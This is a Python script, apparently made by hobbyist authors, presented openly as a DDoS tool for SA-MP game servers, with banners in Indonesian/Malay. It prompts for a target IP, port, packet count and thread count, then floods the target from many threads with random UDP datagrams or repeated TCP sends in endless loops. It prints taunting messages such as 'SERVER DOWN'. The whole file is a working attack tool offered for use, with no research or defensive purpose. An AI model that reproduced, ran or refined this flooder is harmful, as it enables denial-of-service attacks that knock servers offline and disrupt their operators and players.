#!/usr/bin/env python3
#Code by MR.DANI
#REMAKE BY MR.DANI X NDAG OGX
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

os.system("clear")
choice = str(input("AWAS KAU RENAME BABI!!(y/n):"))
os.system("clear")
print("\033[31m =============================================================")
print("\033[31m           » TOOLS BY REMAKE BY MR.DANI X Ndag OgX «
print("\033[31m =============================================================")
print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print("\033[31m »DDOS ATTACK FOR SAMP")
print("\033[31m »Script Ini Dibuat Hanya Untuk Mr.Dani dan NdagOgX")
print("\033[31m =============================================================")

test = input()
if test == "n":
	exit(0)
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" SIAP UNTUK DDOS(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(2567)
	i = random.choice(("[TOK!!TOK!!]","[TOK!!TOK!!]","[TOK!!TOK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PAKET OM DARI MR.DANI DAN NDAG OGX!!!")
		except:
			s.close()
			print("[MAMPUS] SERVER DOWN!!!")

def run2():
	data = random._urandom(1180)
	i = random.choice(("[TOK!!TOK!!]","[TOK!!TOK!!]","[TOK!!TOK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #And here it's using the TCP method as you can see in SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PAKETS OM")
		except:
			s.close()
			print("[MAMPUS] SERVER DOWN !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
	# for windows
    if name == 'nt':
        _ = system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # ini tools ramake
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok, quitting")
        byebye()

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store the original SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)#00000000
